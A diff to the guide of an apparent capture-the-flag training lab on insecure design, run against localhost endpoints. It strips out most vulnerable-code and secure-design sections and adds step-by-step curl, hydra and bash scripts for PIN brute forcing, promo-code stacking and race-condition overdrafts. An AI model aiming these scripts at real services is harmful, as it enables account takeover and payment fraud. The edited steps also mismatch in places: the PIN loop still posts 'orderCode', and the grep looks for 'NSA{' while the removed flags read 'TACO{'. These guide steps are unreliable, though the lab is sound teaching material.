@@ -41,63 +41,64 @@ This lab demonstrates insecure design patterns through a realistic online bankin
 **Stage:** Recon
 
 ### Vulnerability
-No rate limiting on order verification endpoint. Attacker can brute force valid order codes.
+No rate limiting on account verification endpoint. Attacker can brute force valid PINs.
 
-### Exploitation
+### Required Tools
+- `curl` - HTTP POST requests
+- Bash loops - Automated brute forcing
+- `hydra` (optional) - Advanced brute forcing
+
+### Exploitation Steps
+
+**Method 1: Manual Bash Loop**
+
 ```bash
-# Manual testing
-for code in {1000..1050}; do
-    curl -X POST http://localhost:3006/api/lab1/verify-order \
-      -H "Content-Type: application/json" \
-      -d "{\"orderCode\": \"$code\"}"
+# Brute force 4-digit PINs (1000-1050)
+for pin in {1000..1050}; do
+  echo "Testing PIN: $pin"
+  curl -s -X POST http://localhost:3006/api/lab1/verify-order \
+    -H "Content-Type: application/json" \
+    -d "{\"orderCode\": \"$pin\"}" \
+    | grep -o 'NSA{[^}]*}'
+  sleep 0.1
 done
 ```
 
-### Flag Trigger
-After multiple attempts (tracking is shown but not enforced), the system reveals the vulnerability flag.
+**Method 2: Parallel Requests (faster)**
 
-### Vulnerable Code
-```javascript
-app.post('/api/lab1/verify-order', (req, res) => {
-    const { orderCode } = req.body;
-    
-    // DESIGN FLAW: Tracks attempts but never blocks
-    attemptCount++;
-    
-    if (attemptCount > 50) {
-        // Flag awarded but access NOT blocked
-        return res.json({
-            flag: 'TACO{R4T3_L1M1T_M1SS1NG_3XTR4_GU4C}',
-            message: 'Rate limiting missing - unlimited attempts allowed'
-        });
-    }
-});
+```bash
+# Test multiple PINs in parallel
+for pin in {1000..1050}; do
+  curl -s -X POST http://localhost:3006/api/lab1/verify-order \
+    -H "Content-Type: application/json" \
+    -d "{\"orderCode\": \"$pin\"}" &
+done
+wait
 ```
 
-### Secure Design
-```javascript
-const rateLimit = require('express-rate-limit');
+**Method 3: Using Hydra (optional)**
 
-// Rate limiter middleware
-const orderVerifyLimiter = rateLimit({
-    windowMs: 15 * 60 * 1000,  // 15 minutes
-    max: 10,  // 10 attempts per window
-    message: 'Too many verification attempts, try again later'
-});
+```bash
+# Generate PIN wordlist
+seq 1000 1050 > pins.txt
 
-app.post('/api/lab1/verify-order', orderVerifyLimiter, (req, res) => {
-    const { orderCode } = req.body;
-    // Verification logic
-});
+# Hydra brute force (if endpoint accepts form data)
+hydra -L pins.txt -p dummy localhost \
+  -s 3006 \
+  http-post-form "/api/lab1/verify-order:orderCode=^USER^:valid"
 ```
 
-### Teaching Points
-- Rate limiting must be designed into the system from the start
-- Critical for authentication, password reset, and verification endpoints
-- Use proven middleware (express-rate-limit, rate-limiter-flexible)
-- Consider distributed rate limiting (Redis) for scaled applications
+**Method 4: Track Attempts to Trigger Flag**
 
----
+```bash
+# Flag appears after 50+ attempts
+for i in {1..60}; do
+  curl -s -X POST http://localhost:3006/api/lab1/verify-order \
+    -H "Content-Type: application/json" \
+    -d '{"orderCode": "1000"}' \
+    | grep flag
+done
+```
 
 ## LAB 2: Checkout - Business Logic Flaw
 
@@ -107,88 +108,59 @@ app.post('/api/lab1/verify-order', orderVerifyLimiter, (req, res) => {
 ### Vulnerability
 Discount codes can be applied multiple times to the same order, reducing price beyond intended limits.
 
-### Exploitation
+### Required Tools
+- `curl` - HTTP POST requests
+- `jq` - JSON parsing
+
+### Exploitation Steps
+
+**Test Normal Checkout:**
+
 ```bash
-curl -X POST http://localhost:3006/api/lab2/checkout \
+# Single promo code (normal behavior)
+curl -s -X POST http://localhost:3006/api/lab2/checkout \
   -H "Content-Type: application/json" \
   -d '{
     "items": ["taco", "burrito"],
-    "promoCodes": ["TACO10", "TACO10", "TACO10", "TACO10"]
-  }'
+    "promoCodes": ["TACO10"]
+  }' | jq '.'
 ```
 
-### Vulnerable Code
-```javascript
-app.post('/api/lab2/checkout', (req, res) => {
-    let total = calculateTotal(req.body.items);
-    
-    // DESIGN FLAW: No validation of duplicate promo codes
-    req.body.promoCodes.forEach(code => {
-        if (code === 'TACO10') {
-            total *= 0.9;  // 10% off, applied multiple times!
-        }
-    });
-    
-    if (total < originalTotal * 0.5) {
-        // Flag when discount exceeds 50%
-        res.json({
-            flag: 'TACO{L0G1C_FL4W_FR33_GU4C4M0L3}',
-            total: total
-        });
-    }
-});
+**Exploit Promo Code Stacking:**
+
+```bash
+# Apply same promo code multiple times
+curl -s -X POST http://localhost:3006/api/lab2/checkout \
+  -H "Content-Type: application/json" \
+  -d '{
+    "items": ["taco", "burrito"],
+    "promoCodes": ["TACO10", "TACO10", "TACO10", "TACO10", "TACO10"]
+  }' | jq '.'
 ```
 
-### Secure Design
-```javascript
-app.post('/api/lab2/checkout', (req, res) => {
-    let total = calculateTotal(req.body.items);
-    const appliedCodes = new Set();  // Track used codes
-    const maxDiscount = 0.3;  // Maximum 30% total discount
-    let totalDiscount = 0;
-    
-    for (const code of req.body.promoCodes) {
-        // 1. Prevent duplicate codes
-        if (appliedCodes.has(code)) {
-            continue;  // Skip already used codes
-        }
-        
-        // 2. Validate code exists and is active
-        const promoDetails = await db.getPromoCode(code);
-        if (!promoDetails || !promoDetails.isActive) {
-            continue;
-        }
-        
-        // 3. Check usage limits per customer
-        const usageCount = await db.getPromoUsage(req.user.id, code);
-        if (usageCount >= promoDetails.maxUsesPerCustomer) {
-            continue;
-        }
-        
-        // 4. Apply discount with limits
-        const discount = promoDetails.discountPercent;
-        if (totalDiscount + discount <= maxDiscount) {
-            total *= (1 - discount);
-            totalDiscount += discount;
-            appliedCodes.add(code);
-            
-            // 5. Record usage
-            await db.recordPromoUsage(req.user.id, code);
-        }
-    }
-    
-    res.json({ total, appliedCodes: Array.from(appliedCodes) });
-});
+**Extract Flag:**
+
+```bash
+# Stack 5+ codes to exceed 50% discount
+curl -s -X POST http://localhost:3006/api/lab2/checkout \
+  -H "Content-Type: application/json" \
+  -d '{
+    "items": ["taco", "burrito"],
+    "promoCodes": ["TACO10", "TACO10", "TACO10", "TACO10", "TACO10", "TACO10"]
+  }' | jq '.flag'
 ```
 
-### Teaching Points
-- Business logic flaws require design-level thinking
-- Validate all business rules server-side
-- Consider edge cases: multiple applications, stacking, timing
-- Implement maximum discount caps
-- Log all transactions for fraud detection
+**Test Different Promo Codes:**
 
----
+```bash
+# Try multiple different codes
+curl -s -X POST http://localhost:3006/api/lab2/checkout \
+  -H "Content-Type: application/json" \
+  -d '{
+    "items": ["taco"],
+    "promoCodes": ["TACO10", "SAVE20", "DISCOUNT", "PROMO"]
+  }' | jq '.'
+```
 
 ## LAB 3: Wallet - Race Condition Attack
 
@@ -198,9 +170,26 @@ app.post('/api/lab2/checkout', (req, res) => {
 ### Vulnerability
 Check-then-act race condition in balance withdrawal. Multiple concurrent requests can overdraft the account.
 
-### Exploitation
+### Required Tools
+- `curl` - HTTP POST requests
+- Bash background jobs (`&`) - Concurrent execution
+- `xargs` (optional) - Parallel processing
+
+### Exploitation Steps
+
+**Test Normal Withdrawal:**
+
 ```bash
-# Terminal 1-5: Execute simultaneously (within 100ms window)
+# Single withdrawal (should work normally)
+curl -s -X POST http://localhost:3006/api/lab3/withdraw \
+  -H "Content-Type: application/json" \
+  -d '{"amount": 30}' | jq '.'
+```
+
+**Method 1: Manual Concurrent Requests**
+
+```bash
+# Send 3 simultaneous $30 withdrawals (balance is only $50)
 curl -X POST http://localhost:3006/api/lab3/withdraw \
   -H "Content-Type: application/json" \
   -d '{"amount": 30}' &
@@ -213,37 +202,65 @@ curl -X POST http://localhost:3006/api/lab3/withdraw \
   -H "Content-Type: application/json" \
   -d '{"amount": 30}' &
 
-# Wait for all to complete
+# Wait for all requests to complete
 wait
 ```
 
-**Expected:** 3 withdrawals of $30 = $90, but balance is only $50  
-**Result:** All 3 succeed due to race condition, overdrafting to negative balance
+**Method 2: Automated Race Condition Exploit**
 
-### Vulnerable Code
-```javascript
-let balance = 50;
+```bash
+# Launch 5 concurrent withdrawals
+for i in {1..5}; do
+  curl -s -X POST http://localhost:3006/api/lab3/withdraw \
+    -H "Content-Type: application/json" \
+    -d '{"amount": 20}' &
+done
+wait
 
-app.post('/api/lab3/withdraw', async (req, res) => {
-    const { amount } = req.body;
-    
-    // RACE CONDITION: Check and act are separate, not atomic
-    if (balance >= amount) {
-        // Artificial delay simulates database/processing time
-        await sleep(100);
-        
-        balance -= amount;  // Multiple threads can reach here!
-        
-        if (balance < 0) {
-            res.json({
-                flag: 'TACO{R4C3_C0ND1T10N_3XTR4_T4C0S}',
-                balance: balance,
-                message: 'Race condition exploited - overdraft occurred'
-            });
-        }
-    }
-});
+# Check for negative balance (race condition success)
+curl -s http://localhost:3006/api/lab3/balance | jq '.'
 ```
+
+**Method 3: Using xargs for Precise Timing**
+
+```bash
+# Generate 10 identical requests launched simultaneously
+seq 1 10 | xargs -P 10 -I {} curl -s -X POST \
+  http://localhost:3006/api/lab3/withdraw \
+  -H "Content-Type: application/json" \
+  -d '{"amount": 15}' > /dev/null
+
+# Extract flag from response
+curl -s http://localhost:3006/api/lab3/balance | grep -o 'NSA{[^}]*}'
+```
+
+**Method 4: Shell Script for Repeatable Exploit**
+
+```bash
+#!/bin/bash
+# race-exploit.sh
+
+URL="http://localhost:3006/api/lab3/withdraw"
+REQUESTS=5
+AMOUNT=25
+
+echo "Launching $REQUESTS concurrent withdrawal requests..."
+
+for i in $(seq 1 $REQUESTS); do
+  curl -s -X POST "$URL" \
+    -H "Content-Type: application/json" \
+    -d "{\"amount\": $AMOUNT}" \
+    | jq '.flag // .balance' &
+done
+
+wait
+echo "Race condition attack complete"
+```
+
+**Expected Result:**
+- Balance: $50
+- 3 withdrawals × $30 = $90
+- Race condition allows all to succeed → negative balance → flag revealed
 
 ### Secure Design - Option 1: Mutex Lock
 ```javascript
